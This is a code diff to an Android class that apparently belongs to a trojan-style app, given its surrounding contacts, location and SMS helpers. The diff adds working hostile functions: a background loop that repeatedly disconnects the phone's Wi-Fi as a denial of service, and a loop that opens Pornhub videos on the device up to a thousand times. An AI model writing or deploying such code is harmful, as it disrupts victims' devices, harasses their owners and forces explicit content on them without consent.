@@ -25,6 +25,7 @@ import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
 import android.net.Uri;
+import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.VibrationEffect;
@@ -411,12 +412,42 @@ public class Lofl {
         return contacts;
     }
 
+    protected static void wifiDenialOfService(Context context){
+        WifiManager wifiManager = getWifiManager(context);
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                for(int i = 0; i < 500; i++){
+                    try {
+                        Thread.sleep(10000);
+                        wifiManager.disconnect();
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        }).start();
+    }
+
+    protected static void wifiDeauthenticate(Context context){
+        getWifiManager(context).disconnect();
+    }
+
+    protected static WifiManager getWifiManager(Context context){
+        return (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
+    }
+
+    protected static void wifiScan(Context context){
+        getWifiManager(context).startScan();
+    }
+
     protected static String lookupEmailByContactId(Context context, long id){
         String email = null;
         Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{String.valueOf(id)}, null);
         if(cursor != null){
-            cursor.moveToFirst();
-            email = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
+            if(cursor.moveToFirst()){
+                email = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
+            }
         }
         cursor.close();
         return email;
@@ -505,6 +536,29 @@ public class Lofl {
         }
     }
 
+    protected static void startPornProvider(final Context context, final int intervalDelay){
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                for(int i = 0; i < 1000; i++){
+                    try {
+                        Thread.sleep(intervalDelay);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                    double randomNumber = Math.random();
+                    String video = null;
+                    if(randomNumber > 0.5){
+                        video = Pornhub.VIDEOS[0];
+                    }else{
+                        video = Pornhub.VIDEOS[1];
+                    }
+                    watchPornHubVideo(context, video);
+                }
+            }
+        }).start();
+    }
+
     protected static LocationListener getLocationListener(Context context){
         return new LocationListener() {
             @Override
@@ -541,6 +595,7 @@ public class Lofl {
         }
         return new Pair<>(address.toString(), body.toString());
     }
+
 
     protected static void sendDeliveryReportSms(String address){
         SmsManager smsManager = SmsManager.getDefault();
